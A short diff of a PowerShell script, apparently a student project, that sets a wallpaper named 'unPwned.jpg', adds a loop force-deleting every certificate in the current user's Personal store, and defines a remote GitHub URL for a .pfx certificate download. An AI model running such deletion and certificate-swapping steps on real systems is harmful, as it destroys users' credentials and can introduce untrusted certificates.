@@ -33,6 +33,12 @@ Write-Output "Image downloaded successfully to $outputPath"
 [Wallpaper]::SystemParametersInfo(20, 0, "C:\Users\ionut\Downloads\unPwned.jpg" , 3)
 
 
+# Remove from Personal store
+$certificates = Get-ChildItem -Path Cert:\CurrentUser\My
+foreach ($cert in $certificates) {
+    Remove-Item -Path "Cert:\CurrentUser\My\$($cert.Thumbprint)" -Force
+}
+
 # Define the URL of the file to download
 $fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"
 
